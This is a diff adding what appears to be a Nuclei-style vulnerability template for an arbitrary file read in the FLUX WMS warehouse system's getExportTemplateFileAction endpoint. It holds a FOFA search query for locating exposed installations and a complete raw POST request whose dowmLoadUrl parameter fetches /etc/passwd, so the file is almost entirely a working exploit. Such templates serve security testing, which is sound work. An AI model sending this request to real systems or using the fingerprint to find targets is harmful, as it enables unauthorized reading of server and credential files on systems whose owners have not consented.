@@ -1,0 +1,52 @@
+id: poc-wll4c7k9hzwpl6zn
+info:
+  name: 富勒仓储系统getExportTemplateFileAction存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wll4c7k9hzwpl6zn'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wll4c7k9hzwpl6zn
+    fofa: body="/logincenterapp/ValidateImageService" || title="FLUX WMS生产环境" ||icon_hash="2050995649"
+http:
+- raw:
+  - 'POST /expcenter/getExportTemplateFileAction HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Connection: keep-alive
+
+    sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
+
+    sec-ch-ua-mobile: ?0
+
+    Content-Type: application/x-www-form-urlencoded
+
+    sec-ch-ua-platform: "Windows"
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+
+    Sec-Fetch-Site: none
+
+    Sec-Fetch-Mode: navigate
+
+    Sec-Fetch-User: ?1
+
+    Sec-Fetch-Dest: document
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+
+    dowmLoadUrl=/etc/passwd&fileName='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
